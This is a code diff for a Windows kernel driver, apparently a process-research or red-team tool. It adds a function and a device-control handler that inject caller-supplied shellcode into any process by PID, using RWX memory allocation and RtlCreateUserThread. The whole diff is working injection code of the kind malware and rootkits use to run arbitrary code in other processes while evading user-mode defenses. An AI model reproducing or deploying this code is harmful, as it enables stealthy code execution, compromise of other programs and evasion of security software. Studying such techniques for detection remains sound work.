@@ -965,6 +965,144 @@ ULONG64 FindPspLoadImageNotifyRoutine(WINDOWS_VERSION WindowsVersion)
 	return FindCallbackArray(L"PsSetLoadImageNotifyRoutine");
 }
 
+// ============== Kernel Shellcode Injection Implementation ==============
+
+// RtlCreateUserThread function pointer type
+typedef NTSTATUS(NTAPI* PfnRtlCreateUserThread)(
+	IN HANDLE ProcessHandle,
+	IN PSECURITY_DESCRIPTOR SecurityDescriptor,
+	IN BOOLEAN CreateSuspended,
+	IN ULONG StackZeroBits,
+	IN OUT PULONG StackReserved,
+	IN OUT PULONG StackCommit,
+	IN PVOID StartAddress,
+	IN PVOID StartParameter,
+	OUT PHANDLE ThreadHandle,
+	OUT PCLIENT_ID ClientID
+	);
+
+// Kernel shellcode injection function based on reference implementation
+NTSTATUS KernelInjectShellcode(ULONG ProcessId, PVOID Shellcode, SIZE_T ShellcodeSize, PVOID* AllocatedAddress)
+{
+	NTSTATUS status = STATUS_UNSUCCESSFUL;
+	PEPROCESS pEProcess = NULL;
+	KAPC_STATE apcState = { 0 };
+	PfnRtlCreateUserThread RtlCreateUserThread = NULL;
+	HANDLE hThread = NULL;
+	PVOID pShellcodeMemory = NULL;
+
+	__try
+	{
+		// Get RtlCreateUserThread function address dynamically
+		UNICODE_STRING ustrRtlCreateUserThread;
+		RtlInitUnicodeString(&ustrRtlCreateUserThread, L"RtlCreateUserThread");
+		RtlCreateUserThread = (PfnRtlCreateUserThread)MmGetSystemRoutineAddress(&ustrRtlCreateUserThread);
+		if (RtlCreateUserThread == NULL)
+		{
+			KdPrint((DRIVER_PREFIX "Failed to get RtlCreateUserThread address\n"));
+			return STATUS_NOT_FOUND;
+		}
+
+		// Lookup process by PID
+		status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)ProcessId, &pEProcess);
+		if (!NT_SUCCESS(status))
+		{
+			KdPrint((DRIVER_PREFIX "Failed to lookup process %u: 0x%X\n", ProcessId, status));
+			return status;
+		}
+
+		// Attach to target process
+		KeStackAttachProcess(pEProcess, &apcState);
+
+		// Allocate memory in target process for shellcode
+		SIZE_T allocSize = ShellcodeSize;
+		status = ZwAllocateVirtualMemory(
+			ZwCurrentProcess(),
+			&pShellcodeMemory,
+			0,
+			&allocSize,
+			MEM_COMMIT | MEM_RESERVE,
+			PAGE_EXECUTE_READWRITE
+		);
+
+		if (!NT_SUCCESS(status))
+		{
+			KdPrint((DRIVER_PREFIX "Failed to allocate memory: 0x%X\n", status));
+			KeUnstackDetachProcess(&apcState);
+			ObDereferenceObject(pEProcess);
+			return status;
+		}
+
+		// Write shellcode to allocated memory
+		__try
+		{
+			RtlCopyMemory(pShellcodeMemory, Shellcode, ShellcodeSize);
+			KdPrint((DRIVER_PREFIX "Shellcode written to 0x%p, size %zu\n", pShellcodeMemory, ShellcodeSize));
+		}
+		__except (EXCEPTION_EXECUTE_HANDLER)
+		{
+			KdPrint((DRIVER_PREFIX "Failed to write shellcode\n"));
+			KeUnstackDetachProcess(&apcState);
+			ObDereferenceObject(pEProcess);
+			return STATUS_ACCESS_VIOLATION;
+		}
+
+		// Validate address is accessible
+		if (!MmIsAddressValid(pShellcodeMemory))
+		{
+			KdPrint((DRIVER_PREFIX "Shellcode address is not valid\n"));
+			KeUnstackDetachProcess(&apcState);
+			ObDereferenceObject(pEProcess);
+			return STATUS_INVALID_ADDRESS;
+		}
+
+		// Create thread at shellcode address using RtlCreateUserThread
+		status = RtlCreateUserThread(
+			ZwCurrentProcess(),
+			NULL,
+			FALSE,
+			0,
+			0,
+			0,
+			pShellcodeMemory,
+			NULL,
+			&hThread,
+			NULL
+		);
+
+		if (!NT_SUCCESS(status))
+		{
+			KdPrint((DRIVER_PREFIX "RtlCreateUserThread failed: 0x%X\n", status));
+			KeUnstackDetachProcess(&apcState);
+			ObDereferenceObject(pEProcess);
+			return status;
+		}
+
+		// Close thread handle
+		if (hThread)
+		{
+			ZwClose(hThread);
+		}
+
+		*AllocatedAddress = pShellcodeMemory;
+		KdPrint((DRIVER_PREFIX "Shellcode injection successful - PID: %u, Address: 0x%p\n", ProcessId, pShellcodeMemory));
+
+		KeUnstackDetachProcess(&apcState);
+		ObDereferenceObject(pEProcess);
+		return STATUS_SUCCESS;
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER)
+	{
+		KdPrint((DRIVER_PREFIX "Exception during shellcode injection\n"));
+		if (pEProcess)
+		{
+			KeUnstackDetachProcess(&apcState);
+			ObDereferenceObject(pEProcess);
+		}
+		return STATUS_UNSUCCESSFUL;
+	}
+}
+
 NTSTATUS DioProcessDeviceControl(PDEVICE_OBJECT, PIRP Irp)
 {
 	auto irpSp = IoGetCurrentIrpStackLocation(Irp);
@@ -1635,6 +1773,73 @@ NTSTATUS DioProcessDeviceControl(PDEVICE_OBJECT, PIRP Irp)
 
 		KdPrint((DRIVER_PREFIX "Found %d active image load callbacks\n", validCount));
 		info = requiredSize;
+		break;
+	}
+
+	// ============== Kernel Shellcode Injection IOCTL ==============
+
+	case IOCTL_DIOPROCESS_KERNEL_INJECT_SHELLCODE:
+	{
+		KdPrint((DRIVER_PREFIX "Kernel shellcode injection request\n"));
+
+		auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
+		auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
+
+		if (inputLen < sizeof(KernelInjectShellcodeRequest))
+		{
+			status = STATUS_BUFFER_TOO_SMALL;
+			break;
+		}
+
+		if (outputLen < sizeof(KernelInjectShellcodeResponse))
+		{
+			status = STATUS_BUFFER_TOO_SMALL;
+			break;
+		}
+
+		auto request = (KernelInjectShellcodeRequest*)Irp->AssociatedIrp.SystemBuffer;
+		auto response = (KernelInjectShellcodeResponse*)Irp->AssociatedIrp.SystemBuffer;
+
+		if (!request || request->ShellcodeSize == 0)
+		{
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		// Validate buffer size
+		SIZE_T expectedSize = FIELD_OFFSET(KernelInjectShellcodeRequest, Shellcode) + request->ShellcodeSize;
+		if (inputLen < expectedSize)
+		{
+			status = STATUS_BUFFER_TOO_SMALL;
+			break;
+		}
+
+		KdPrint((DRIVER_PREFIX "Injecting %u bytes of shellcode into PID %u\n",
+			request->ShellcodeSize, request->TargetProcessId));
+
+		PVOID allocatedAddress = nullptr;
+		status = KernelInjectShellcode(
+			request->TargetProcessId,
+			request->Shellcode,
+			request->ShellcodeSize,
+			&allocatedAddress
+		);
+
+		if (NT_SUCCESS(status))
+		{
+			response->Success = TRUE;
+			response->AllocatedAddress = (ULONG64)allocatedAddress;
+			info = sizeof(KernelInjectShellcodeResponse);
+			KdPrint((DRIVER_PREFIX "Kernel shellcode injection successful\n"));
+		}
+		else
+		{
+			response->Success = FALSE;
+			response->AllocatedAddress = 0;
+			info = sizeof(KernelInjectShellcodeResponse);
+			KdPrint((DRIVER_PREFIX "Kernel shellcode injection failed: 0x%X\n", status));
+		}
+
 		break;
 	}
 
